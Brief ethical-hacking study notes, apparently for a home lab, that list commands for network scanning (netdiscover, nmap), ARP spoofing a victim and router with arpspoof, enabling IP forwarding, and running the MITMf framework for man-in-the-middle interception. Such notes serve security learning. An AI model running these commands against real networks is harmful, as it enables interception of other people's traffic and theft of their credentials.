# Ethical Hacking Notes


# Man in the Middle Attack


## Scan related

```console
arp -a
```

Check arp table on Windows


```console
netdiscover -r 10.0.2.0/24
```

Simplified version of nmap 

```console
nmap 10.0.2.0/24
```

Discover all IP and ports in the local network

## ARP Setup target victim PC

```console
arpspoof -i eth0 -t 10.0.2.15 10.0.2.1
```

10.0.2.15 is the target IP, 10.0.2.1 is router IP, this will tell victim PC I'm the router.

```console
arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
```

This will tell router, I'm the victim PC.

## Man in the middle framework

Installation

https://github.com/byt3bl33d3r/MITMf.wiki.git


Remember to turn on IP forward, or victim PC cannot access internet
```console
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Start

```console
python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15
```

# DNS Attack



```console
python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15
```